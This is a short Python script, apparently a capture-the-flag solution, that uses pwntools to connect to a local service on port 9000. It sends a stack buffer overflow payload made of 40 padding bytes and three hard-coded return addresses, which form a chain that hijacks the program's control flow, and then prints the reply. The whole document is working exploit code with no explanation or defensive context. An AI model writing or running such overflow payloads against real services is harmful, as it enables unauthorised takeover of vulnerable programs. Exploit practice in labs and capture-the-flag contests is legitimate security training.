from pwn import *

p = remote('0.0.0.0', 9000)
payload = (b'A'*40+p64(0x0000000000401194)+p64(0x00000000004011a5)+p64(0x0000000000401156))
p.sendline(payload)
response = p.recvall()
print(response)